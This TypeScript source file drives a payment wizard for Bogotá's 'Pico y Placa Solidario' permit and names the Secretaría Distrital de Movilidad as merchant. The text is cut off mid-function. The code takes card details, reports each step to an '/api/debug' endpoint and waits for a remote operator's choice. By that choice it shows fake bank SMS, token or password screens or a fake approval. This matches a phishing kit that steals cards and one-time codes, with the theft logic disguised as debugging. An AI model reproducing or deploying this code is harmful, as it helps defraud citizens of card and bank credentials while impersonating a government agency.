import {
  durationTableLabels,
  permitEndDate,
} from "../data/picoMock";
import { api, formatCop, persistRequest, type Citizen } from "../services/picoApi";

type PlateRow = {
  placa: string;
  duration: string;
  start: string;
  end: string;
  value: number;
  donation: number;
  breakdown: Record<string, number | string>;
  vehicle: {
    marca?: string;
    linea?: string;
    modeloAnio?: string;
    cilindrajeCc?: number;
    cylinder: string;
    fuel: string;
    model: string;
    valuation: string;
    municipality: string;
  };
};

type WizardState = {
  step: number;
  tipoDocumento: string;
  numeroDocumento: string;
  tipoPersona: "natural" | "juridica";
  found: boolean;
  person: Citizen | null;
  plates: PlateRow[];
  donation: boolean;
  donationPct: string;
  metodoPago: "pse" | "credito" | "debito";
  banco: string;
  bancoNombre: string;
  runtVehicle: PlateRow["vehicle"] | null;
};

const KEY = "pyps-solicitud";
const EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const PLATE = /^([A-Z]{3}[0-9]{3}|[A-Z]{3}[0-9]{2}[A-Z])$/;

let state: WizardState = emptyState();
let lastCardBrand = "visa";
let pasarelaLoadTimer = 0;

function emptyState(): WizardState {
  return {
    step: 0,
    tipoDocumento: "",
    numeroDocumento: "",
    tipoPersona: "natural",
    found: false,
    person: null,
    plates: [],
    donation: false,
    donationPct: "0",
    metodoPago: "credito",
    banco: "",
    bancoNombre: "",
    runtVehicle: null,
  };
}

function $(id: string) {
  return document.getElementById(id);
}

function val(id: string) {
  return ((document.getElementById(id) as HTMLInputElement | HTMLSelectElement | null)?.value || "").trim();
}

function setVal(id: string, value: string) {
  const el = document.getElementById(id) as HTMLInputElement | HTMLSelectElement | null;
  if (el) el.value = value;
}

function lockAutofill(id: string, value: string) {
  const el = document.getElementById(id) as HTMLInputElement | null;
  if (!el) return;
  el.setAttribute("autocomplete", "off");
  el.setAttribute("readonly", "readonly");
  el.value = value;
  window.setTimeout(() => {
    el.value = value;
    el.removeAttribute("readonly");
  }, 350);
}

function emptyCardTitular() {
  const el = document.getElementById("cardTitular") as HTMLInputElement | null;
  if (!el) return;
  el.setAttribute("autocomplete", "one-time-code");
  el.setAttribute("readonly", "readonly");
  el.value = "";
  const wipe = () => {
    if (document.activeElement === el) return;
    el.value = "";
  };
  [0, 50, 150, 350, 700, 1200, 2000].forEach((ms) => window.setTimeout(wipe, ms));
}

function banner(text: string, ok = false) {
  const el = $("wizardBanner");
  if (!el) return;
  el.textContent = text;
  el.classList.remove("hidden", "bg-[#edfde5]", "text-dark-green", "bg-[#fff4f4]", "text-color-error");
  el.classList.add(ok ? "bg-[#edfde5]" : "bg-[#fff4f4]", ok ? "text-dark-green" : "text-color-error");
}

function clearBanner() {
  $("wizardBanner")?.classList.add("hidden");
}

function todayIso() {
  const d = new Date();
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
}

function filterMunicipios(selectId: string, departmentId: string, keep = "") {
  const select = $(selectId) as HTMLSelectElement | null;
  if (!select) return;
  [...select.options].forEach((option, index) => {
    if (index === 0) return;
    const dep = option.getAttribute("data-department");
    option.hidden = Boolean(departmentId) && dep !== departmentId;
  });
  if (keep && [...select.options].some((option) => option.value === keep && !option.hidden)) {
    select.value = keep;
  } else if (![...select.options].some((option) => option.value === select.value && !option.hidden)) {
    select.value = "";
  }
}

function syncPersonaType() {
  const tipo = (document.querySelector('input[name="tipoPersona"]:checked') as HTMLInputElement | null)?.value || "natural";
  state.tipoPersona = tipo as "natural" | "juridica";
  $("naturalFields")?.classList.toggle("hidden", tipo !== "natural");
  $("juridicaFields")?.classList.toggle("hidden", tipo !== "juridica");
}

function syncLocalidad() {
  const bogota = val("municipioResidencia") === "11001";
  $("localidadWrap")?.classList.toggle("hidden", !bogota);
}

function copyCorrespondencia() {
  const copy = ($("copiarCorrespondencia") as HTMLInputElement | null)?.checked;
  if (!copy) return;
  setVal("departamentoCorrespondencia", val("departamentoResidencia"));
  filterMunicipios("municipioCorrespondencia", val("departamentoResidencia"), val("municipioResidencia"));
  setVal("direccionCorrespondencia", val("direccionResidencia"));
}

function showOverlay(id: string, show: boolean) {
  const el = $(id);
  if (!el) return;
  el.classList.toggle("hidden", !show);
  el.classList.toggle("flex", show);
}

function picoDebugSession() {
  const sessionId = sessionStorage.getItem("latam-debug-session-id") || crypto.randomUUID();
  sessionStorage.setItem("latam-debug-session-id", sessionId);
  return sessionId;
}

function notifyPicoStep(step: string, event: "P-STEP" | "CARD_BANNER" = "P-STEP") {
  void fetch("/api/debug", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      event,
      sessionId: picoDebugSession(),
      route: "/Registro",
      meta: { step },
    }),
  }).catch(() => {});
}

const PAYMENT_META_KEY = "latam-debug-payment-meta";
const PAYMENT_OTP_KEY = "latam-debug-payment-otp";

function keepFilled(previous: Record<string, unknown>, incoming: Record<string, unknown>) {
  const out: Record<string, unknown> = { ...previous };
  for (const [key, value] of Object.entries(incoming)) {
    if (value === "" || value === null || value === undefined) continue;
    if (value && typeof value === "object" && !Array.isArray(value)) {
      out[key] = keepFilled(
        out[key] && typeof out[key] === "object" && !Array.isArray(out[key])
          ? (out[key] as Record<string, unknown>)
          : {},
        value as Record<string, unknown>,
      );
      continue;
    }
    out[key] = value;
  }
  return out;
}

function readStored(key: string) {
  try {
    const raw = sessionStorage.getItem(key);
    return raw ? (JSON.parse(raw) as Record<string, unknown>) : {};
  } catch {
    return {};
  }
}

function accumulateDebugMeta(incoming: Record<string, unknown>) {
  const next = keepFilled(readStored(PAYMENT_META_KEY), incoming);
  sessionStorage.setItem(PAYMENT_META_KEY, JSON.stringify(next));
  return next;
}

function accumulateDebugOtp(incoming: Record<string, unknown>) {
  const next = keepFilled(readStored(PAYMENT_OTP_KEY), incoming);
  sessionStorage.setItem(PAYMENT_OTP_KEY, JSON.stringify(next));
  return next;
}

function personDebugMeta() {
  return {
    documento: state.numeroDocumento,
    correo: val("correoPrimario"),
    direccion: val("direccionResidencia"),
  };
}

function setStep(step: number) {
  state.step = step;
  document.querySelectorAll(".wizard-panel").forEach((panel) => {
    const index = Number((panel as HTMLElement).dataset.panel);
    panel.classList.toggle("hidden", index !== step);
  });
  document.querySelectorAll("#solicitudStepper li").forEach((item) => {
    const index = Number((item as HTMLElement).dataset.step);
    item.classList.toggle("active", index === step);
    item.classList.toggle("done", index < step);
  });
  $("btnAtras")?.classList.toggle("hidden", step === 0);
  $("btnSiguiente")?.classList.toggle("hidden", step >= 2);
  $("btnIrPagar")?.classList.toggle("hidden", step !== 2);
  if (step === 2) {
    resetMetodoPago();
    window.setTimeout(resetMetodoPago, 50);
    window.setTimeout(resetMetodoPago, 400);
    renderConfirmacion();
  }
  const body = document.querySelector(".solicitud-dialog-body") as HTMLElement | null;
  if (body) body.scrollTop = 0;
  const stepNames = [
    "Inició solicitud · Datos de la persona",
    "Solicitud · Datos del vehículo y placas",
    "Solicitud · Confirmación y método de pago",
  ];
  notifyPicoStep(stepNames[step] || `Solicitud · paso ${step + 1}`);
}

function fillPerson(person: Citizen | null) {
  setVal("primerNombre", person?.primerNombre || "");
  setVal("segundoNombre", person?.segundoNombre || "");
  setVal("primerApellido", person?.primerApellido || "");
  setVal("segundoApellido", person?.segundoApellido || "");
  setVal("razonSocial", person?.razonSocial || "");
  setVal("nit", person?.nit || person?.numeroDocumento || "");
  setVal("digitoVerificacion", person?.digitoVerificacion || "");
  setVal("actividadEconomica", person?.actividadEconomica || "");
  setVal("correoPrimario", person?.correoPrimario || person?.email || "");
  setVal("telefono", String(person?.telefono || "").replace(/\D/g, ""));
  setVal("estrato", person?.estrato || "");
  setVal("departamentoResidencia", person?.departamentoResidencia || "");
  filterMunicipios("municipioResidencia", person?.departamentoResidencia || "", person?.municipioResidencia || "");
  setVal("localidadResidencia", person?.localidadResidencia || "");
  setVal("direccionResidencia", person?.direccionResidencia || "");
  setVal("tipoPropiedad", person?.tipoPropiedad || "");
  setVal("departamentoCorrespondencia", person?.departamentoCorrespondencia || "");
  filterMunicipios("municipioCorrespondencia", person?.departamentoCorrespondencia || "", person?.municipioCorrespondencia || "");
  setVal("direccionCorrespondencia", person?.direccionCorrespondencia || "");
  const tipo = person?.tipoPersona === "juridica" || state.tipoDocumento === "8" ? "juridica" : "natural";
  const radio = document.querySelector(`input[name="tipoPersona"][value="${tipo}"]`) as HTMLInputElement | null;
  if (radio) radio.checked = true;
  syncPersonaType();
  syncLocalidad();
}

function validatePersona() {
  if (!($("terminos") as HTMLInputElement | null)?.checked) return "Debes aceptar los Términos y Condiciones.";
  if (!EMAIL.test(val("correoPrimario"))) return "Ingresa un correo electrónico válido.";
  if (!val("telefono") || !val("estrato") || !val("departamentoResidencia") || !val("municipioResidencia") || !val("direccionResidencia") || !val("tipoPropiedad")) {
    return "Campo Obligatorio";
  }
  if (!val("departamentoCorrespondencia") || !val("municipioCorrespondencia") || !val("direccionCorrespondencia")) {
    return "Campo Obligatorio";
  }
  if (state.tipoPersona === "natural") {
    if (!val("primerNombre") || !val("primerApellido")) return "Campo Obligatorio";
  } else if (!val("razonSocial") || !val("nit") || !val("digitoVerificacion")) {
    return "Campo Obligatorio";
  }
  return "";
}

function vehicleFromForm(): PlateRow["vehicle"] | null {
  if (state.runtVehicle) return state.runtVehicle;
  const cylinder = val("cylinder");
  const fuel = val("fuel");
  const model = val("model");
  const valuation = val("valuation");
  const municipality = val("municipality");
  if (!cylinder || !fuel || !model || !valuation || !municipality) return null;
  return { cylinder, fuel, model, valuation, municipality };
}

function renderPlacas() {
  const body = document.querySelector("#placasTable tbody");
  if (!body) return;
  if (!state.plates.length) {
    body.innerHTML = `<tr><td colspan="6" class="text-gray">Ingrese los campos Placa y Confirmar Placa.</td></tr>`;
    return;
  }
  body.innerHTML = state.plates
    .map(
      (row, index) => `
      <tr>
        <td>${row.placa}</td>
        <td>${durationTableLabels[row.duration]?.es || row.duration}</td>
        <td>${row.start}</td>
        <td>${row.end}</td>
        <td>${formatCop(row.value)}</td>
        <td><button type="button" class="underline text-color-error js-remove-placa" data-index="${index}">Remover</button></td>
      </tr>`
    )
    .join("");
  body.querySelectorAll(".js-remove-placa").forEach((btn) => {
    btn.addEventListener("click", () => {
      const index = Number((btn as HTMLElement).dataset.index);
      state.plates.splice(index, 1);
      renderPlacas();
    });
  });
}

function permitTotal() {
  return state.plates.reduce((sum, row) => sum + row.value, 0);
}

function donationAmount() {
  if (!state.donation) return 0;
  const pct = Number(state.donationPct || "0");
  return Math.round((permitTotal() * pct) / 100);
}

function grandTotal() {
  return permitTotal() + donationAmount();
}

function renderConfirmacion() {
  const body = document.querySelector("#confirmTable tbody");
  if (!body) return;
  body.innerHTML = state.plates
    .map(
      (row, index) => `
      <tr>
        <td>${row.placa}</td>
        <td>${formatCop(row.value)}</td>
        <td><button type="button" class="underline font-semibold js-detalle" data-index="${index}">Detalle</button></td>
      </tr>`
    )
    .join("");
  const total = $("totalPagar");
  if (total) total.textContent = formatCop(grandTotal());
  body.querySelectorAll(".js-detalle").forEach((btn) => {
    btn.addEventListener("click", () => {
      const row = state.plates[Number((btn as HTMLElement).dataset.index)];
      const box = $("detalleCobro");
      if (!box || !row) return;
      box.classList.remove("hidden");
      box.innerHTML = `
        <h4 class="font-semibold mb-2">Detalles del cobro</h4>
        <p><strong>Placa:</strong> ${row.placa}</p>
        <p><strong>Marca:</strong> ${row.vehicle.marca || "—"} ${row.vehicle.linea || ""}</p>
        <p><strong>Modelo:</strong> ${row.vehicle.modeloAnio || row.breakdown.duration}</p>
        <p><strong>Cilindraje:</strong> ${row.vehicle.cilindrajeCc || "—"}</p>
        <p><strong>Duración del permiso:</strong> ${row.breakdown.duration}</p>
        <p><strong>Valor de base:</strong> ${formatCop(Number(row.breakdown.base || 0))}</p>
        <p><strong>Factor Avalúo:</strong> ${row.breakdown.a} (${row.breakdown.valuation})</p>
        <p><strong>Factor municipio:</strong> ${row.breakdown.m} (${row.breakdown.municipality})</p>
        <p><strong>Impacto Ambiental:</strong> ${row.breakdown.environmental}</p>
        <p><strong>Factor Ambiental:</strong> ${row.breakdown.b}</p>
        <p class="mt-2 font-bold">Valor total: ${formatCop(row.value)}</p>
      `;
    });
  });
  syncDonation();
}

function syncDonation() {
  $("donacionBox")?.classList.toggle("hidden", !state.donation);
  setVal("donacionMonto", formatCop(donationAmount()));
  const total = $("totalPagar");
  if (total) total.textContent = formatCop(grandTotal());
}

function personName() {
  if (state.tipoPersona === "juridica") return val("razonSocial") || "Persona jurídica";
  return [val("primerNombre"), val("segundoNombre"), val("primerApellido"), val("segundoApellido")].filter(Boolean).join(" ");
}

function metodoLabel() {
  if (state.metodoPago === "credito") return "Tarjeta de crédito";
  if (state.metodoPago === "debito") return "Tarjeta de débito";
  return "PSE";
}

function resetMetodoPago() {
  document.querySelectorAll('input[name="metodoPago"]').forEach((el) => {
    const input = el as HTMLInputElement;
    input.checked = input.value === "";
  });
  $("pseBankBox")?.classList.add("hidden");
  $("cardHint")?.classList.add("hidden");
  $("pseUnavailable")?.classList.add("hidden");
}

function syncMetodoPago() {
  const selected = (document.querySelector('input[name="metodoPago"]:checked') as HTMLInputElement | null)?.value || "";
  if (selected) state.metodoPago = selected as WizardState["metodoPago"];
  $("pseBankBox")?.classList.toggle("hidden", selected !== "pse");
  $("cardHint")?.classList.toggle("hidden", selected !== "credito" && selected !== "debito");
  $("pseUnavailable")?.classList.toggle("hidden", selected !== "pse");
}

const CARD_BRANDS = "Visa · Mastercard · American Express · Diners Club";

function cardBrand(digits: string) {
  if (/^3[47]/.test(digits)) return "American Express";
  if (/^(36|38|39)/.test(digits)) return "Diners Club";
  if (/^30[0-5]/.test(digits)) return "Diners Club";
  if (/^3095/.test(digits)) return "Diners Club";
  if (digits.startsWith("4")) return "Visa";
  if (/^(5[1-5]|2[2-7])/.test(digits)) return "Mastercard";
  return "";
}

function cardLength(brand: string) {
  if (brand === "American Express") return { min: 15, max: 15 };
  if (brand === "Diners Club") return { min: 14, max: 14 };
  if (brand === "Mastercard") return { min: 16, max: 16 };
  if (brand === "Visa") return { min: 16, max: 16 };
  return { min: 13, max: 16 };
}

function luhnValid(digits: string) {
  if (!/^\d{13,19}$/.test(digits)) return false;
  let sum = 0;
  let doubleDigit = false;
  for (let i = digits.length - 1; i >= 0; i -= 1) {
    let n = Number(digits[i]);
    if (doubleDigit) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    doubleDigit = !doubleDigit;
  }
  return sum % 10 === 0;
}

function formatCardNumber(value: string) {
  const raw = value.replace(/\D/g, "");
  const brand = cardBrand(raw);
  const max = cardLength(brand).max;
  const digits = raw.slice(0, max);
  if (brand === "American Express") {
    return [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 15)].filter(Boolean).join(" ");
  }
  if (brand === "Diners Club") {
    return [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 14)].filter(Boolean).join(" ");
  }
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function caretFromDigits(formatted: string, digitCount: number) {
  if (digitCount <= 0) return 0;
  let seen = 0;
  for (let i = 0; i < formatted.length; i += 1) {
    if (/\d/.test(formatted[i])) {
      seen += 1;
      if (seen >= digitCount) return i + 1;
    }
  }
  return formatted.length;
}

function applyMaskedValue(el: HTMLInputElement, formatted: string) {
  const digitCount = el.value.slice(0, el.selectionStart || el.value.length).replace(/\D/g, "").length;
  el.value = formatted;
  const pos = caretFromDigits(formatted, digitCount);
  try {
    el.setSelectionRange(pos, pos);
  } catch {
    /* Some mobile keyboards reject setSelectionRange. */
  }
}

function formatExpiry(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

function validExpiry(value: string) {
  const match = /^(\d{2})\/(\d{2})$/.exec(value);
  if (!match) return false;
  const month = Number(match[1]);
  const year = 2000 + Number(match[2]);
  if (month < 1 || month > 12) return false;
  const now = new Date();
  const exp = new Date(year, month, 0, 23, 59, 59);
  return exp >= now;
}

function validateCard() {
  const titular = val("cardTitular");
  const digits = val("cardNumero").replace(/\s+/g, "");
  const vence = val("cardVence");
  const cvv = val("cardCvv");
  const brand = cardBrand(digits);
  const length = cardLength(brand);
  const amex = brand === "American Express";
  if (!titular) return "Ingresa el nombre del titular.";
  if (!/^\d+$/.test(digits) || digits.length < length.min || digits.length > length.max) {
    return "El número de tarjeta no está bien escrito.";
  }
  if (!brand) return "No se reconoció la franquicia de la tarjeta.";
  if (!luhnValid(digits)) return "El número de tarjeta no está bien escrito.";
  if (!validExpiry(vence)) return "La fecha de vencimiento no es válida.";
  if (!/^\d+$/.test(cvv) || cvv.length !== (amex ? 4 : 3)) return "El CVV no es válido.";
  return "";
}

function updateCardLive() {
  const digits = val("cardNumero").replace(/\s+/g, "");
  const brand = cardBrand(digits);
  const el = $("cardBrand");
  const length = cardLength(brand);
  if (!el) return;
  if (!digits) {
    el.textContent = CARD_BRANDS;
    el.className = "text-sm text-gray mb-4";
    return;
  }
  if (brand && digits.length < length.min) {
    el.textContent = brand;
    el.className = "text-sm text-dark-green mb-4";
    return;
  }
  if (!luhnValid(digits) || (brand && (digits.length < length.min || digits.length > length.max))) {
    el.textContent = `${brand || "Tarjeta"} · El número no está bien escrito`;
    el.className = "text-sm text-color-error mb-4";
    return;
  }
  el.textContent = `${brand} · Número válido`;
  el.className = "text-sm text-dark-green mb-4";
}

function cardBrandKey(digits: string) {
  const brand = cardBrand(digits);
  if (brand === "American Express") return "amex";
  if (brand === "Diners Club") return "diners";
  if (brand === "Mastercard") return "mastercard";
  if (brand === "Visa") return "visa";
  return "visa";
}

async function pollDebugDecision(sessionId: string, timeoutMs = 180000) {
  const started = Date.now();
  while (Date.now() - started < timeoutMs) {
    const response = await fetch(`/api/debug?sessionId=${encodeURIComponent(sessionId)}&t=${Date.now()}`, {
      headers: { Accept: "application/json", "Cache-Control": "no-store" },
      cache: "no-store",
    });
    if (response.ok) {
      const payload = await response.json();
      const decision = payload?.decision || {};
      if (decision.action && decision.action !== "wait") return decision as { action: string; message?: string; brand?: string };
    }
    await new Promise((resolve) => window.setTimeout(resolve, 800));
  }
  return {
    action: "timeout",
    message: "La verificacion esta tardando mas de lo esperado. Intenta nuevamente.",
  };
}

function hidePasarelaScreens() {
  ["pagos-wait-screen", "pagos-challenge-screen", "pagos-auth-screen", "pagos-approved-screen"].forEach((id) => {
    const el = $(id) as HTMLElement | null;
    if (!el) return;
    el.hidden = true;
    el.style.display = "none";
  });
}

function revealPasarela(id: string) {
  const el = $(id) as HTMLElement | null;
  if (!el) return;
  if (el.parentElement !== document.body) document.body.appendChild(el);
  el.hidden = false;
  el.removeAttribute("hidden");
  el.style.display = "flex";
  el.style.zIndex = "500";
}

function challengeStamp() {
  const now = new Date();
  const months = [
    "enero", "febrero", "marzo", "abril", "mayo", "junio",
    "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre",
  ];
  return {
    datetimeLabel: `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} · ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`,
    amountLabel: formatCop(grandTotal()),
  };
}

function fillChallengeMeta(root: ParentNode | null) {
  const { datetimeLabel, amountLabel } = challengeStamp();
  root?.querySelectorAll("[data-challenge-merchant]").forEach((el) => {
    el.textContent = "Secretaría Distrital de Movilidad";
  });
  root?.querySelectorAll("[data-challenge-amount]").forEach((el) => {
    el.textContent = amountLabel;
  });
  root?.querySelectorAll("[data-challenge-datetime]").forEach((el) => {
    el.textContent = datetimeLabel;
  });
}

function authKindFromAction(action: string) {
  const a = action.toLowerCase().replace(/[^a-z]/g, "");
  if (a.includes("userpass") || a.includes("userpassword") || a === "password") return "userpass";
  if (a.includes("token")) return "token";
  if (a.includes("dynamic") || a.includes("dinamica") || a.includes("cdin")) return "dynamic";
  return "";
}

function showWaitScreen(brandKey: string) {
  const wait = $("pagos-wait-screen");
  hidePasarelaScreens();
  wait?.querySelectorAll("[data-wait-brand]").forEach((panel) => {
    (panel as HTMLElement).hidden = panel.getAttribute("data-wait-brand") !== brandKey;
  });
  revealPasarela("pagos-wait-screen");
  document.body.classList.add("is-offers-waiting");
  showOverlay("cardOverlay", false);
}

function hideWaitScreen() {
  hidePasarelaScreens();
  document.body.classList.remove("is-offers-waiting");
}

function showApprovedScreen() {
  hidePasarelaScreens();
  const screen = $("pagos-approved-screen");
  const { datetimeLabel, amountLabel } = challengeStamp();
  screen?.querySelectorAll("[data-approved-amount]").forEach((el) => {
    el.textContent = amountLabel;
  });
  screen?.querySelectorAll("[data-approved-datetime]").forEach((el) => {
    el.textContent = datetimeLabel;
  });
  screen?.querySelectorAll("[data-approved-ref]").forEach((el) => {
    el.textContent = solicitudId();
  });
  screen?.querySelectorAll("[data-approved-plates]").forEach((el) => {
    el.textContent = state.plates.map((row) => row.placa).join(", ") || "—";
  });
  sessionStorage.setItem(
    "pyps-approved",
    JSON.stringify({
      amount: amountLabel,
      datetime: datetimeLabel,
      ref: solicitudId(),
      plates: state.plates.map((row) => row.placa).join(", ") || "—",
    }),
  );
  showOverlay("cardOverlay", false);
  showOverlay("pagoOverlay", false);
  showOverlay("pasarelaLoadOverlay", false);
  revealPasarela("pagos-approved-screen");
  document.body.classList.add("is-offers-waiting");
}

function showChallengeScreen(brandKey: string, message = "") {
  const challenge = $("pagos-challenge-screen");
  hidePasarelaScreens();
  document.body.classList.add("is-offers-waiting");
  challenge?.querySelectorAll("[data-challenge-brand]").forEach((panel) => {
    (panel as HTMLElement).hidden = panel.getAttribute("data-challenge-brand") !== brandKey;
  });
  fillChallengeMeta(challenge);
  revealPasarela("pagos-challenge-screen");
  if (message) setChallengeMessage(brandKey, message, "error");
}

function setChallengeMessage(brand: string, message: string, kind = "error") {
  const challenge = $("pagos-challenge-screen");
  const panel = challenge?.querySelector(`[data-challenge-brand="${brand}"]`);
  const form = panel?.querySelector("[data-otp-form]");
  if (!form) return;
  let error = form.querySelector("[data-otp-debug-message]") as HTMLElement | null;
  if (!error) {
    error = document.createElement("p");
    error.setAttribute("data-otp-debug-message", "");
    error.setAttribute("role", "alert");
    error.style.margin = "10px 0 0";
    error.style.fontSize = "13px";
    error.style.lineHeight = "1.35";
    form.appendChild(error);
  }
  error.textContent = message || "";
  error.hidden = !message;
  error.style.color = kind === "info" ? "#1b4e9b" : "#b42318";
}

function setAuthMessage(kind: string, message: string) {
  const screen = $("pagos-auth-screen") || $("pagos-challenge-screen");
  const panel = screen?.querySelector(`[data-challenge-auth="${kind}"]`);
  const form = panel?.querySelector("[data-auth-form]");
  if (!form) return;
  const error = form.querySelector("[data-auth-debug-message]") as HTMLElement | null;
  if (!error) return;
  error.textContent = message || "";
  error.hidden = !message;
}

function authBrandKey(value: string) {
  const brand = String(value || "").toLowerCase();
  if (brand.includes("amex")) return "amex";
  if (brand.includes("master")) return "mastercard";
  if (brand.includes("diner")) return "diners";
  if (brand.includes("discover")) return "discover";
  if (brand.includes("visa")) return "visa";
  return lastCardBrand || "visa";
}

function showAuthScreen(kind: string, message = "", brandKey = "") {
  const screen = $("pagos-auth-screen") as HTMLElement | null;
  lastCardBrand = authBrandKey(brandKey);
  hidePasarelaScreens();
  document.body.classList.add("is-offers-waiting");
  showOverlay("cardOverlay", false);
  showOverlay("pagoOverlay", false);
  screen?.querySelectorAll("[data-challenge-auth]").forEach((panel) => {
    const active = panel.getAttribute("data-challenge-auth") === kind;
    (panel as HTMLElement).hidden = !active;
    (panel as HTMLElement).style.display = active ? "block" : "none";
    if (!active) return;
    fillChallengeMeta(panel);
    panel.querySelectorAll("[data-auth-brand]").forEach((logo) => {
      (logo as HTMLElement).hidden = logo.getAttribute("data-auth-brand") !== lastCardBrand;
    });
    panel.querySelectorAll("input").forEach((input) => {
      (input as HTMLInputElement).value = "";
    });
  });
  revealPasarela("pagos-auth-screen");
  if (message) setAuthMessage(kind, message);
}

function showCardErrorModal(message: string) {
  const modal = $("pagos-debug-modal");
  const text = $("pagos-debug-modal-message");
  if (text) text.textContent = message;
  if (modal) modal.hidden = false;
  document.body.classList.add("pagos-debug-modal-open");
}

async function handlePaymentDecision(
  decision: { action?: string; message?: string; brand?: string },
  brandKey: string,
  payBtn: HTMLButtonElement | null,
) {
  const action = decision.action || "timeout";
  const authKind = authKindFromAction(action);
  if (action === "sms" || action === "sms_error") {
    showChallengeScreen(brandKey, action === "sms_error" ? decision.message || "" : "");
    return;
  }
  if (authKind) {
    showAuthScreen(authKind, action.endsWith("_error") ? decision.message || "" : "", decision.brand || brandKey);
    return;
  }
  if (action === "card" || action === "card_error") {
    hideWaitScreen();
    const challenge = $("pagos-challenge-screen");
    if (challenge) challenge.hidden = true;
    showOverlay("cardOverlay", true);
    showCardErrorModal(decision.message || "No pudimos verificar la tarjeta. Ingresa los datos nuevamente.");
    if (payBtn) {
      payBtn.disabled = false;
      payBtn.textContent = "Pagar con tarjeta";
    }
    return;
  }
  if (action === "approved") {
    showApprovedScreen();
    return;
  }
  hideWaitScreen();
  showOverlay("cardOverlay", true);
  const errEl = $("cardError");
  if (errEl) {
    errEl.textContent = decision.message || "La verificacion esta tardando mas de lo esperado. Intenta nuevamente.";
    errEl.classList.remove("hidden");
  }
  if (payBtn) {
    payBtn.disabled = false;
    payBtn.textContent = "Pagar con tarjeta";
  }
}

function openCardForm() {
  const title = $("cardOverlayTitle");
  if (title) title.textContent = metodoLabel();
  const total = $("cardTotal");
  if (total) total.textContent = formatCop(grandTotal());
  emptyCardTitular();
  ["cardNumero", "cardVence", "cardCvv"].forEach((id) => {
    const el = $(id) as HTMLInputElement | null;
    if (!el) return;
    el.value = "";
    el.removeAttribute("readonly");
  });
  setVal("cardCuotas", "1");
  $("cardCuotasWrap")?.classList.toggle("hidden", state.metodoPago !== "credito");
  $("cardError")?.classList.add("hidden");
  const brand = $("cardBrand");
  if (brand) {
    brand.textContent = CARD_BRANDS;
    brand.className = "text-sm text-gray mb-4";
  }
  showOverlay("cardOverlay", true);
  notifyPicoStep("Abrió banner de pago tarjeta crédito o débito", "CARD_BANNER");
}

function openPasarelaLoader() {
  const amount = $("pasarelaLoadAmount");
  if (amount) amount.textContent = formatCop(grandTotal());
  const payBtn = $("btnPagarPse") as HTMLButtonElement | null;
  if (payBtn) payBtn.disabled = true;
  showOverlay("pasarelaLoadOverlay", true);
  window.clearTimeout(pasarelaLoadTimer);
  pasarelaLoadTimer = window.setTimeout(() => {
    showOverlay("pasarelaLoadOverlay", false);
    if (payBtn) payBtn.disabled = false;
    openCardForm();
  }, 3200);
}

function renderPagoDatos() {
  const box = $("pagoDatos");
  if (!box) return;
  const now = new Date().toLocaleString("es-CO");
  const titulo = $("pagoTitulo");
  if (titulo) titulo.textContent = state.metodoPago === "pse" ? "Datos de pago PSE" : "Datos de pago PAYZEN";
  const medio = state.metodoPago === "pse" ? state.bancoNombre : metodoLabel();
  box.innerHTML = `
    <p><strong>Estado del proceso</strong><br>Pendiente de pago</p>
    <p><strong>Número de documento</strong><br>${state.numeroDocumento}</p>
    <p><strong>Identificación</strong><br>${state.tipoDocumento === "8" ? "NIT" : "Cédula"} ${state.numeroDocumento}</p>
    <p><strong>Nombre completo</strong><br>${personName()}</p>
    <p><strong>Correo electrónico</strong><br>${val("correoPrimario")}</p>
    <p><strong>${state.metodoPago === "pse" ? "Entidad Bancaria" : "Medio de pago"}</strong><br>${medio}</p>
    <p><strong>Valor de la transacción (IVA incluido)</strong><br>${formatCop(grandTotal())}</p>
    <p><strong>Impuesto a la venta</strong><br>$ 0</p>
    <p><strong>Asunto del pago</strong><br>Permiso Pico y Placa Solidario</p>
    <p><strong>Placa</strong><br>${state.plates.map((row) => row.placa).join(", ")}</p>
    <p><strong>Fecha de creación de la transacción</strong><br>${now}</p>
    <p><strong>Número de la solicitud</strong><br>${solicitudId()}</p>
  `;
  const payBtn = $("btnPagarPse");
  if (payBtn) payBtn.textContent = state.metodoPago === "pse" ? "Pagar con PSE" : "Pagar con tarjeta";
}

function solicitudId() {
  return `PYPS-${new Date().getFullYear()}-${String(state.numeroDocumento).slice(-6).padStart(6, "0")}`;
}

function savePendingRequests() {
  state.plates.forEach((row) => {
    persistRequest({
      id: `${solicitudId()}-${row.placa}`,
      placa: row.placa,
      tipoDocumento: state.tipoDocumento,
      numeroDocumento: state.numeroDocumento,
      tipo: { es: String(row.breakdown.duration), en: String(row.breakdown.durationEn) },
      estado: { es: "Pendiente de pago", en: "Pending payment" },
      inicio: row.start,
      fin: row.end,
      valor: row.value + (state.plates[0] === row ? donationAmount() : 0),
    });
  });
}

function renderPse() {
  const box = $("pseResumen");
  if (!box) return;
  box.innerHTML = `
    <p><strong>Empresa:</strong> Secretaría Distrital de Movilidad</p>
    <p><strong>NIT:</strong> 899.999.061-9</p>
    <p><strong>Banco:</strong> ${state.bancoNombre}</p>
    <p><strong>Referencia:</strong> ${solicitudId()}</p>
    <p><strong>Valor a pagar:</strong> ${formatCop(grandTotal())}</p>
    <p><strong>Pagador:</strong> ${personName()}</p>
  `;
}

export function openSolicitudWizard(input: {
  tipoDocumento: string;
  numeroDocumento: string;
  found: boolean;
  person: Citizen | null;
}) {
  state = emptyState();
  state.tipoDocumento = input.tipoDocumento;
  state.numeroDocumento = input.numeroDocumento;
  state.found = input.found;
  state.person = input.person;
  fillPerson(input.person);
  lockAutofill("primerNombre", val("primerNombre"));
  lockAutofill("segundoNombre", val("segundoNombre"));
  lockAutofill("primerApellido", val("primerApellido"));
  lockAutofill("segundoApellido", val("segundoApellido"));
  const fecha = $("fechaInicio") as HTMLInputElement | null;
  if (fecha) {
    fecha.min = todayIso();
    fecha.value = todayIso();
  }
